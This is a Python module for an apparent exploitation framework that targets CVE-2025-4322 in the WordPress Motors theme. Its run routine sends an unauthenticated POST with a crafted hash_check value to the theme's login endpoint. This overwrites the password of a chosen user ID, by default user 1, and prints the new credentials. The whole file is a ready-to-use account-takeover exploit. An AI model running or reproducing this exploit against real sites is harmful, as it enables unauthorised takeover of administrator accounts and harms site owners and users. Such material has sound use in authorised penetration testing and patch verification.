#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Motors CVE-2025-4322 — unauthenticated stm_new_password overwrite."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Motors CVE-2025-4322 password change",
        "description": (
            "Sets a new password for user_id via Motors theme login endpoints. "
            "Outputs credentials only — no framework session."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-4322"],
        "tags": ["wordpress", "motors", "theme", "password-reset", "auxiliary", "cve-2025-4322"],
        "agent": {"approval_required": True, "produces": ["credentials"]},
    }

    path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "WordPress user ID", required=False)
    login_path = OptString("/login", "Motors login page path", required=False)
    new_password = OptString("", "New password (random if empty)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        uid = int(self.user_id or 1)
        pwd = (self.new_password or "").strip() or secrets.token_urlsafe(14)
        path = self._join((self.login_path or "/login").strip())
        r = self.http_request(
            method="POST",
            path=path,
            params={"user_id": str(uid), "hash_check": "%C0"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"stm_new_password": pwd},
            allow_redirects=False,
        )
        if not r or "stm-validation-message" not in (r.text or ""):
            print_error("Password change not accepted — try LOGIN_PATH")
            return False
        print_success(f"Password change submitted for user_id={uid}")
        print_status(f"Try wp-login with user id {uid} and password: {pwd}")
        return True
